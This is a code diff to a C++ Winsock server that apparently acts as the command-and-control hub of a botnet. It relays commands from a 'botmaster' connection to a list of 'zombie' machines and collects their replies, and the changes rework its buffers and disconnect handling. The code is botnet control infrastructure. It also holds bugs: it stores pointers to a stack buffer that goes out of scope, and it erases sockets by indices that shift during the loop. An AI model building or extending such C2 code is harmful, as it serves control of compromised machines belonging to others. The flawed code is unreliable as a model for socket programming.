@@ -1,6 +1,6 @@
 #include "Server.h"
 
-Server::Server(std::string ip, int port)
+Server::Server(const char* ip, int port)
 	: m_IpAddress(ip), m_Port(port)
 {
 }
@@ -87,6 +87,7 @@ int Server::acceptConnection()
 		else
 		{
 			char buf[4096];
+			SecureZeroMemory(buf, sizeof(buf));
 			if (recv(m_Client, buf, sizeof(buf), 0))
 			{
 				std::string tmp = buf;
@@ -102,10 +103,14 @@ int Server::acceptConnection()
 				}
 				else
 				{
+					shutdown(m_Client, SD_SEND);
+					closesocket(m_Client);
 					return WEIRDO;
 				}
 			}
 			else {
+				shutdown(m_Client, SD_SEND);
+				closesocket(m_Client);
 				return WEIRDO;	//todo endless loop stops server from doing things
 			}
 		}
@@ -113,23 +118,23 @@ int Server::acceptConnection()
 	return -1;
 }
 
-void Server::sendToZombies(const std::string& msg)
+void Server::sendToZombies(const char* msg, int size)
 {
 	for (SOCKET zombie : m_Zombies)
-		sendToZombie(zombie, msg);
+		sendToZombie(zombie, msg, size);
 }
 
-bool Server::sendToZombie(SOCKET zombie, const std::string& msg)
+bool Server::sendToZombie(SOCKET zombie, const char* msg, int size)
 {
-	int sended = send(zombie, msg.c_str(), msg.size(), 0);
+	int sended = send(zombie, msg, size, 0);
 	if (sended == SOCKET_ERROR)
 		return false;
 	return true;
 }
 
-bool Server::sendToBotmaster(const std::string& msg)
+bool Server::sendToBotmaster(const char* msg, int size)
 {
-	int sended = send(m_Botmaster, msg.c_str(), msg.size(), 0);
+	int sended = send(m_Botmaster, msg, size, 0);
 	if (sended == SOCKET_ERROR)
 		return false;
 	return true;
@@ -139,40 +144,49 @@ bool Server::receive()
 {
 	bool rcvAnything = false;
 
-	m_BotMasterBuf.clear();
-	char botMasterBuf[4096];
-	SecureZeroMemory(botMasterBuf, sizeof(botMasterBuf));
+	SecureZeroMemory(m_BotMasterBuf, sizeof(m_BotMasterBuf));
 	if (FD_ISSET(m_Botmaster, &m_Readfds))
 	{
-		int received = recv(m_Botmaster, botMasterBuf, sizeof(botMasterBuf), 0);
-		if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
+		int received = recv(m_Botmaster, m_BotMasterBuf, sizeof(m_BotMasterBuf), 0);
+		if (received == SOCKET_ERROR)	//received == 0 means that the connection got closed gracefully
 		{
-			closesocket(m_Botmaster);
-			m_Botmaster = INVALID_SOCKET;
+			std::cout << "Botmaster forces a disconnect" << std::endl; 
+			m_BotMasterDisconnect = true;
+		}
+		else if (received == 0)
+		{
+			std::cout << "Botmaster disconnected succesfully" << std::endl;
+			m_BotMasterDisconnect = true;
 		}
 		else
 		{
-			m_BotMasterBuf = botMasterBuf;
+			m_BotMasterDisconnect = false;
 		}
 		rcvAnything = true;
 	}
-
-	m_BotBufs.clear();
+	
+	m_ZombieBufs.clear();
+	m_ZombieDisconnects.clear();
 	for (int i = 0; i < m_Zombies.size(); i ++)
 	{
-		char botBuf[4096];
-		SecureZeroMemory(botBuf, sizeof(botMasterBuf));
 		if (FD_ISSET(m_Zombies[i], &m_Readfds))
 		{
+			char botBuf[4096];
+			SecureZeroMemory(botBuf, sizeof(botBuf));
 			int received = recv(m_Zombies[i], botBuf, sizeof(botBuf), 0);
-			if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
+			if (received == SOCKET_ERROR)	//received == 0 means that the connection got closed gracefully
 			{
-				closesocket(m_Zombies[i]);
-				m_Zombies.erase(m_Zombies.begin() + i);
+				std::cout << "Zombie forces a disconnect" << std::endl;
+				m_ZombieDisconnects.push_back(i);	//store index in m_Zombies from clients who wants to disconnect
+			}
+			else if (received == 0)
+			{
+				std::cout << "Zombie disconnected succesfully" << std::endl;
+				m_ZombieDisconnects.push_back(i);
 			}
 			else
 			{
-				m_BotBufs.push_back(std::pair<SOCKET, std::string>(m_Zombies[i], botBuf));
+				m_ZombieBufs.push_back(std::pair<SOCKET, const char*>(m_Zombies[i], botBuf));
 			}
 			rcvAnything = true;
 		}
@@ -180,15 +194,41 @@ bool Server::receive()
 	return rcvAnything;
 }
 
-std::string Server::getBotMasterMessage()
+const char* Server::getBotMasterMessage()
 {
 	return m_BotMasterBuf;
 }
 
-std::vector<std::string> Server::getBotMessages()
+std::vector<const char*> Server::getBotMessages()
 {
-	std::vector<std::string> msgs;
-	for(auto msg : m_BotBufs)
+	std::vector<const char*> msgs;
+	for(std::pair<SOCKET, const char*> msg : m_ZombieBufs)
 		msgs.push_back(msg.second);
 	return msgs;
+}
+
+bool Server::clientDisconnect()
+{
+	return m_BotMasterDisconnect || !m_ZombieDisconnects.empty();
+}
+
+void Server::closeConnections()
+{
+	//HANDLE NewEvent = WSACreateEvent();
+	if (m_BotMasterDisconnect)
+	{
+		//WSAEventSelect(m_Botmaster, NewEvent, FD_CLOSE);
+		shutdown(m_Botmaster, SD_SEND);
+		closesocket(m_Botmaster);
+		m_Botmaster = INVALID_SOCKET;
+	}
+	for (int i = 0; i < m_ZombieDisconnects.size(); i++)
+	{
+		//WSAEventSelect(m_Zombies[m_ZombieDisconnects[i]], NewEvent, FD_CLOSE);
+		shutdown(m_Zombies[m_ZombieDisconnects[i]], SD_SEND);
+		closesocket(m_Zombies[m_ZombieDisconnects[i]]);
+		m_Zombies.erase(m_Zombies.begin() + m_ZombieDisconnects[i]);
+	}
+	
+	
 }
